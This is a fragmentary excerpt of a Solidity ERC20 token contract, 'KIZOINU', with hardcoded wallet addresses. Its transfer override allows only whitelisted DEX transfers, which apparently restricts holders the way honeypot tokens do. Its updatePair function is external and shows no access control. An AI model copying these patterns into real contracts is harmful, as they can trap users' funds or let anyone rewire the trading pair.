...
contract KIZOINU is ERC20, Ownable {
    ...
    // **** added ath amount and timestamp trackers, non essential feature
    uint256 public ath;
    uint256 public athTimestamp;

    address payable public marketingWallet =
        payable(0xdeF3914eFf4194944Cef65744c68B8B4D1e0A57F);
    //payable(0xeDF80132193a82340469f25F780F88c6c289e8a6);
    address payable public devWallet =
        payable(0x358192e4A600B07376532938f0EC8a379E088e11);
    ...
    modifier onlyDex(address target) {
        require(
            isWhitelisted[msg.sender] == true || isWhitelisted[target] == true,
            "Only DEX transfers"
        );
        _;
    }
    ...
    // **********added explicit transfer and transferFrom overrides
    function transfer(address recipient, uint256 amount)
        public
        override
        onlyDex(recipient)
    ...
    function updatePair(address _newAddress) external {
        if (_newAddress != uniswapV2Pair) {
            setWhitelist(uniswapV2Pair, false);
            setWhitelist(_newAddress, true);
    ...
    function approveUniswap() external {
        //  _allowances[msg.sender][UNISWAP_ROUTER] = type(uint256).max;
        // _allowances[msg.sender][_pair] = type(uint256).max;
